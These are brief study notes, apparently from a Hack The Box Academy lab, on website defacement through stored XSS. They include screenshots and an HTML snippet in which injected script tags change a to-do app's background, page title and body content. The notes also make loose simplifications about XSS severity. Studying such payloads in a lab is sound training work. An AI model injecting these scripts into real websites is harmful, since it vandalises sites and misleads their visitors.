...
---
Stored XSS is most critical and DOM XSS is least. One of the type of attacks is defacing when hacker change the look of website. It is type of stored XSS
...
![To-Do List with 'Your Task' input and 'Reset' button.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_defacing_background_color.jpg)
...
![Browser tab showing HackTheBox Academy.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_defacing_page_title.jpg)
...
![Cyber Security Training by Hack The Box.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_defacing_change_text.jpg)
...
```html
<div></div><ul class="list-unstyled" id="todo"><ul> <script>document.body.style.background = "#141d2b"</script> </ul><ul><script>document.title = 'HackTheBox Academy'</script> </ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'
</script> </ul></ul>
```
